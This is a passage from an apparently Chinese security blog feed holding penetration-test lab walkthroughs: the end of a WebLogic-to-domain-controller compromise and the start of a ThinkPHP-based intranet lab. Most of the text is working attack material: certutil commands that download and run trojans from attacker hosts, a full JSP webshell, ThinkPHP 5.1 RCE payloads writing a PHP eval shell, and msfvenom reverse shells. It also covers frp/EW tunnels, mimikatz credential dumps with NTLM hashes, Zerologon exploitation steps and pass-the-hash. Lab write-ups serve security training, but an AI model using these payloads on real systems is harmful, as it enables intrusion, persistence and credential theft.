class="line"><span class="meta prompt_">#</span><span class="language-bash">下载木马文件到weblogic服务器：</span></span><br><span class="line">http://192.168.1.28:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=certutil.exe -urlcache -split -f http://192.168.1.141/bind_8899.exe c:\44.exe</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行下载的木马文件：</span></span><br><span class="line">http://192.168.1.28:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=cmd /c start c:\44.exe</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">MSF通过代理正向连接建立会话</span></span><br><span class="line">setg proxies socks5:47.101.214.85:6001</span><br></pre></td></tr></table></figure><p>得到权限为administrator管理员用户权限，尝试 getsystem 成功提权到system权限</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211709604.png" alt="image-20220921170903425" style="zoom:50%;" /><p>加载mimikatz，尝试获取机器明文密码及hash：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211709932.png" alt="image-20220921170947710" style="zoom:50%;" /><p>得到如下明文密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win7-1\administrator passwd8@mingy</span><br></pre></td></tr></table></figure><h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>上传jsp马，蚁剑通过代理连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.1.28:7001/bea_wls_internal</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain</span><br><span class="line">meterpreter &gt; upload jsp4ant.jsp servers\\AdminServer\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war</span><br><span class="line">[*] uploading  : jsp4ant.jsp --&gt;servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war</span><br><span class="line">[*] uploaded   : jsp4ant.jsp --&gt;servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\jsp4ant.jsp</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://192.168.1.28:7001/bea_wls_internal/jsp4ant.jsp">http://192.168.1.28:7001/bea_wls_internal/jsp4ant.jsp</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211712281.png" alt="image-20220921171217099" style="zoom:50%;" /><ul><li>jsp4ant.jsp</li></ul><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) </span><br><span class="line">clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;ant&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="二层socks代理"><a href="#二层socks代理" class="headerlink" title="二层socks代理"></a>二层socks代理</h2><p>上传frp，建立socks通道：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211715163.png" alt="image-20220921171514003" style="zoom:50%;" /><ul><li>vps</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>target1</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_11.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks_1]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6001</span><br><span class="line">[socks5_2]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6002</span><br><span class="line">remote_port = 6003</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frps.exe -c frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>target2</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_2.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.141</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks_1]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 6002</span><br></pre></td></tr></table></figure><h1 id="Target3-WIN2012"><a href="#Target3-WIN2012" class="headerlink" title="Target3 - WIN2012"></a>Target3 - WIN2012</h1><blockquote><p>10.10.10.249</p></blockquote><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">net view /domain</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain    //域内主机名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain  //域控主机名</span><br></pre></td></tr></table></figure><h2 id="域内存活主机探测"><a href="#域内存活主机探测" class="headerlink" title="域内存活主机探测"></a>域内存活主机探测</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211717080.png" alt="image-20220921171734935" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbtscan.exe -m 10.10.10.0/24</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211717570.png" alt="image-20220921171748437" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.10.10.6      MINGY\WIN2012              fa:16:3e:07:cc:69 SHARING DC</span><br><span class="line">10.10.10.105    MINGY\WIN7-1               fa:16:3e:b4:b8:f7 SHARING</span><br><span class="line">10.10.10.249    MINGY\PC-WIN2012           fa:16:3e:a2:d5:4c SHARING</span><br></pre></td></tr></table></figure><h2 id="域内横向移动"><a href="#域内横向移动" class="headerlink" title="域内横向移动"></a>域内横向移动</h2><ul><li>wmic横向移动</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic /node:<span class="number">10.10</span>.<span class="number">10.249</span> /user:administrator /password:passwd8@mingy <span class="keyword">process</span> call create <span class="string">&quot;cmd /c certutil.exe -urlcache -split -f http://10.10.10.105:7001/bea_wls_internal/bind_8899.exe c:/windows/temp/test.exe &amp; start c:/windows/temp/test.exe&quot;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211719779.png" alt="image-20220921171908555" style="zoom:50%;" /><ul><li>正向shell</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setg proxies socks5:47.101.214.85:6003</span><br><span class="line">set lport 8899</span><br><span class="line">set rhost 10.10.10.249</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211719595.png" alt="image-20220921171935387" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211719848.png" alt="image-20220921171950652" style="zoom:33%;" /><p>无法获取到明文密码：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211720893.png" alt="image-20220921172011692" style="zoom:33%;" /><p>可以获取到密码hash：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211720949.png" alt="image-20220921172028789" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; creds_msv</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving msv credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line">Username       Domain      NTLM                         SHA1</span><br><span class="line">--------       ------      ----                       ----</span><br><span class="line">Administrator  PC-WIN2012  718233f1bd1be011dc0be7df2b151cef  2124386b53cb80e896c7f6e6ed2dbf7bc9a1e4b9</span><br><span class="line">PC-WIN2012$    MINGY       0a6ce51064b73f3a3c7889c135fcd627  9399380fc9ca18c661c443b4db699141e6776679</span><br><span class="line">zhangsan       MINGY       161cff084477fe596a5db81874498a24  d669f3bccf14bf77d64667ec65aae32d2d10039d</span><br></pre></td></tr></table></figure><h2 id="Netlogon域权限提升"><a href="#Netlogon域权限提升" class="headerlink" title="Netlogon域权限提升"></a>Netlogon域权限提升</h2><blockquote><p>也有一些新的域提权漏洞。可以注意。要记得将域控hash还原，不然会崩</p></blockquote><ol><li>检查是否存在漏洞</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 zerologon_tester.py WIN2012 10.10.10.6</span><br></pre></td></tr></table></figure><ol start="2"><li>置空域账号密码</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 CVE-2020-1472.py WIN2012 WIN2012$ 10.10.10.6</span><br></pre></td></tr></table></figure><ol start="3"><li>获取域控用户hash</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 secretsdump.py &#x27;mingy.com/WIN2012$@10.10.10.6&#x27; -no-pass</span><br></pre></td></tr></table></figure><ol start="4"><li>wmiexec进行hash横向连接</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:69943c5e63b4d2c104dbbcc15138b72b WIN2012$/Administrator@10.10.10.6</span><br></pre></td></tr></table></figure><ol start="5"><li>获取主机ntlm hash</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure><ol start="6"><li>解密</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL</span><br></pre></td></tr></table></figure><ol start="7"><li>还原域控hash</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains python3 reinstalloriginalpw.py WIN2012 10.10.10.6 57dc9431075b22b267b4df27b3be1162</span><br></pre></td></tr></table></figure><h1 id="Target4-DC"><a href="#Target4-DC" class="headerlink" title="Target4 - DC"></a>Target4 - DC</h1><blockquote><p>10.10.10.6</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mingy\zhangsan</span><br><span class="line">161cff084477fe596a5db81874498a24</span><br></pre></td></tr></table></figure><h2 id="PTH拿下域控"><a href="#PTH拿下域控" class="headerlink" title="PTH拿下域控"></a>PTH拿下域控</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211726954.png" alt="image-20220921172610679" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211726726.png" alt="image-20220921172623464" style="zoom:50%;" /><h2 id="vssadmin获取域内hash"><a href="#vssadmin获取域内hash" class="headerlink" title="vssadmin获取域内hash"></a>vssadmin获取域内hash</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211726701.png" alt="image-20220921172638442" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211727674.png" alt="image-20220921172700421" style="zoom:50%;" /><h2 id="解密域内密码hash"><a href="#解密域内密码hash" class="headerlink" title="解密域内密码hash"></a>解密域内密码hash</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secretsdump.py -system system_mingy.hive -ntds ntd3_mingy.dit LOCAL</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211728071.png" alt="image-20220921172722684" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试靶场一</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%80.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%80.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">218.76.8.99:2780 --&gt; 10.30.1.181:80</span><br><span class="line">218.76.8.99:2722 --&gt; 10.30.1.105:22</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 公网</span></span><br><span class="line">Attack-Kali：</span><br><span class="line">218.76.8.99 2722[ssh] root/123456</span><br><span class="line"></span><br><span class="line">WEB1<span class="emphasis">_Thinkphp5_</span>Win7</span><br><span class="line">218.76.8.99:2780 --&gt; 10.30.1.181:80</span><br><span class="line">pts 172.26.2.182</span><br><span class="line">pts1 172.26.3.63</span><br><span class="line">administrator/hacking@hetian</span><br><span class="line"></span><br><span class="line"><span class="section"># 内网</span></span><br><span class="line">WEB1<span class="emphasis">_HongCMS_</span>Win7</span><br><span class="line">pts 172.26.2.174</span><br><span class="line">pts1 172.26.3.18</span><br><span class="line">administrator/hacking@hetian</span><br><span class="line"></span><br><span class="line">WEB2-Weblogic<span class="emphasis">_RCE</span></span><br><span class="line"><span class="emphasis">pts1 172.26.3.62</span></span><br><span class="line"><span class="emphasis">pts2 172.26.4.66</span></span><br><span class="line"><span class="emphasis">root/hacking@hetian</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">WEB2_</span>Strtus2<span class="emphasis">_Centos</span></span><br><span class="line"><span class="emphasis">172.26.3.75</span></span><br><span class="line"><span class="emphasis">administrator/hacking@hetian</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">WEB3_</span>Thinkcmf<span class="emphasis">_Win7</span></span><br><span class="line"><span class="emphasis">172.26.4.22</span></span><br><span class="line"><span class="emphasis">administrator/hacking@hetian</span></span><br></pre></td></tr></table></figure><h1 id="寻找突破点-WEB1-Thinkphp5"><a href="#寻找突破点-WEB1-Thinkphp5" class="headerlink" title="寻找突破点 - WEB1_Thinkphp5"></a>寻找突破点 - WEB1_Thinkphp5</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol><li>Acunetix扫描目标 <a href="http://218.76.8.99:2780/">http://218.76.8.99:2780/</a></li><li>Wappalyzer</li><li>目录扫描</li></ol><blockquote><ul><li>dirsearch</li><li>dirb kali中很好用的一个工具</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http:��218.76.8.99:2780/ -e *</span><br></pre></td></tr></table></figure><ul><li>御剑目录扫描</li></ul></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><a href="http://218.76.8.99:2780/public/index.php">http://218.76.8.99:2780/public/index.php</a></p></blockquote><ol><li>thinkphp5.1-rce写Webshell</li></ol><ul><li>命令执行</li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=whoami</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=/index/\think\request/cache&amp;key=whoami|system</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><ul><li>写webshell</li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=m.php&amp;vars[1][]=%3C?php%20@eval($_POST[c]);?%3E</span><br></pre></td></tr></table></figure><ul><li>certutil下载webshell</li></ul><blockquote><p>利用命令执行在目标主机上利用certutil命令下载webshell</p><p>Windows命令行如何下载文件，参考之前的blog：</p><blockquote><p><a href="https://11pmsleep.github.io/2022-09-17-%E7%9F%A5%E8%AF%86/Windows/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/">windows 命令行下载文件</a></p></blockquote></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=cmd /c certutil.exe -urlcache -split -f http://139.155.49.43:8000/bx3.php C:/phpStudy/PHPTutorial/WWW/public/bx3.php</span><br></pre></td></tr></table></figure><h2 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h2><ol><li>msfvenom生成后门，并上传至靶机，msf开启监听</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># msfvenom</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=5555 -f exe &gt; re5555.exe</span><br><span class="line"><span class="comment"># metasploit</span></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 39.108.68.207</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 10001</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[-] Handler failed to <span class="built_in">bind</span> to 39.108.68.207:10001:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:10001</span><br><span class="line">[*] Sending stage (200262 bytes) to 218.76.8.99</span><br><span class="line">[*] Meterpreter session 1 opened (172.18.66.74:10001 --&gt;218.76.8.99:19931) at 2020-11-28 18:49:40 +0800</span><br><span class="line"><span class="comment"># webshell</span></span><br><span class="line">start re5555.exe</span><br></pre></td></tr></table></figure><ol start="2"><li>thinkphp5.1-rce 写 msf 木马，然后执行上线 msf</li></ol><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=cmd /c certutil.exe -urlcache -split -f http://139.155.49.43:8000/re5555.exe C:/windows/re5555.exe</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#attack</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=c:\windows\re5555.exe</span><br></pre></td></tr></table></figure><h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>cobaltstrike生产后门，并上传至靶机，执行payload上线beacon。操作类似</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公网或kali ==&gt; thinkphp[2网段] ==&gt; HongCMS[2,3网段] ==&gt; struts2[3网段] ==&gt; weblogic[3,4网段] ==&gt; thinkcmf[4网段]</span><br></pre></td></tr></table></figure><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># getuid</span></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"><span class="comment"># 网卡信息</span></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">IPv4 Address : 172.26.2.182</span><br><span class="line">meterpreter &gt; run get_local_subnets（run post/multi/manage/autoroute）</span><br><span class="line">Local subnet: 172.26.2.0/255.255.255.0</span><br><span class="line"><span class="comment"># 配置路由</span></span><br><span class="line">meterpreter &gt; run autoroute -s 172.26.2.0/24 </span><br><span class="line"><span class="comment"># 扫描存活主机</span></span><br><span class="line"><span class="comment">## ping简单方法但比较慢</span></span><br><span class="line"><span class="keyword">for</span> /L %P <span class="keyword">in</span> (1,1,254) <span class="keyword">do</span> @ping -w 10 -n 1 172.26.2.%P | findstr TTL= &gt;&gt; ip.txt</span><br><span class="line"><span class="comment">## ladon</span></span><br><span class="line">Ladon64.exe 172.26.2.0/24 OnlinePC</span><br><span class="line">Arch: amd64 OS: windows</span><br><span class="line">Targe: 172.26.2.0/24</span><br><span class="line">Load PingScan</span><br><span class="line">PING: 172.26.2.182</span><br><span class="line">PING: 172.26.2.174</span><br><span class="line">PING: 172.26.2.2</span><br><span class="line">PING: 172.26.2.1</span><br><span class="line">PING: 172.26.2.35</span><br><span class="line"><span class="comment">## fscan</span></span><br><span class="line">fscan.exe -h 172.26.2.0/24</span><br><span class="line"><span class="comment">## arp cache</span></span><br><span class="line">meterpreter &gt; arp -a</span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    127.255.255.255  ff:ff:ff:ff:ff:ff  14</span><br><span class="line">    172.26.2.1       fa:16:3e:e8:10:f2  11</span><br><span class="line">    172.26.2.2       fa:16:3e:20:b5:a6  11</span><br><span class="line">    172.26.2.35      fa:16:3e:e2:d4:c1  11</span><br><span class="line">    172.26.2.174     fa:16:3e:62:60:33  11</span><br><span class="line">    172.26.2.255     ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  14</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.252      00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:<span class="built_in">fc</span>  14</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:<span class="built_in">fc</span>  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line"><span class="comment">## cobaltstrike内网主机存活探测</span></span><br><span class="line">portscan</span><br><span class="line">portscan主要是通过ping syn arp三种方式探测内网存活的主机</span><br></pre></td></tr></table></figure><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><ol><li>msf的 auxiliary&#x2F;server&#x2F;socks_proxy 模块</li></ol><blockquote><p>在该靶场中不稳定，容易断，而且慢</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; options</span><br><span class="line">Module options (auxiliary/server/socks_proxy):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          <span class="built_in">yes</span>       The address to listen on</span><br><span class="line">   SRVPORT   1080             <span class="built_in">yes</span>       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">   VERSION   5                <span class="built_in">yes</span>       The SOCKS version to use (Accepted: 4a, 5)</span><br><span class="line">Auxiliary action:</span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  Run a SOCKS proxy server</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 1.</span><br></pre></td></tr></table></figure><ol start="2"><li>EW</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># VPS</span></span><br><span class="line">./ew_for_linux64 -s rcsocks -l 6611 -e 6000</span><br><span class="line"><span class="comment"># webshell</span></span><br><span class="line">ew1 -s rssocks -d 139.155.49.43 -e 6000</span><br></pre></td></tr></table></figure><ol start="3"><li>FRP</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:&gt; frpc.exe -c frpc.ini</span><br><span class="line">C:&gt; <span class="built_in">type</span> frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 47.101.214.85</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 8000</span><br></pre></td></tr></table></figure><ol start="4"><li>CS socks</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; socks 6000</span><br></pre></td></tr></table></figure><ol start="5"><li>连接代理</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># proxychains</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks4 47.101.214.85 8000</span><br><span class="line"># proxifier</span><br></pre></td></tr></table></figure><ol start="6"><li>stowaway很好用</li></ol><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -T4 172.26.2.174</span><br></pre></td></tr></table></figure><h1 id="2-x网段渗透-172-26-2-174-win7-HongCMS"><a href="#2-x网段渗透-172-26-2-174-win7-HongCMS" class="headerlink" title="2.x网段渗透 - 172.26.2.174[win7-HongCMS]"></a>2.x网段渗透 - 172.26.2.174[win7-HongCMS]</h1><h2 id="开放80端口"><a href="#开放80端口" class="headerlink" title="开放80端口"></a>开放80端口</h2><p>配置浏览器代理进行访问</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201357177.png" alt="image-20220920135732962" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201357689.png" alt="image-20220920135746470" style="zoom:50%;" /><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>通过对网页的浏览得到目标为php语言 配置proxifier代理将敏感目录扫描工具代理进内网</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211457165.png" alt="image-20220921145746831"></p><p>通过7kbscan扫描敏感路径得到admin后台路径</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211458869.png" alt="image-20220921145804631"></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>扫到后台不要急着爆破，可以先判断是否存在用户名枚举漏洞，或者说判断出一个用户名是否存在，不然要同时爆破用户名和密码是很麻烦的</p><p>还有一些其他思路也是要考虑到的</p><blockquote><ol><li>SQLMap注入</li></ol><p>sqlmap -r 抓取的文件，，然后跑一遍，康康有莫有注入漏洞</p><ol start="2"><li><p>445端口ms17-010</p></li><li><p>HongCMS</p></li></ol><blockquote><p>WEB后台：<a 